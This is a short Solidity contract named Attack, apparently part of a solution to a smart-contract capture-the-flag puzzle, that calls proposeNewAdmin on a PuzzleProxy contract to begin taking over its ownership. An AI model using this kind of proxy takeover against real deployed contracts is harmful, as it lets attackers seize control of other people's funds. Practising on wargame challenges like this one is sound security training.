// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "puz.sol";


contract Attack {
    PuzzleProxy public px;


    constructor(address _add) {
        px = PuzzleProxy(_add);

    }

    function run(address _own) external{   
        px.proposeNewAdmin(_own);

    }
}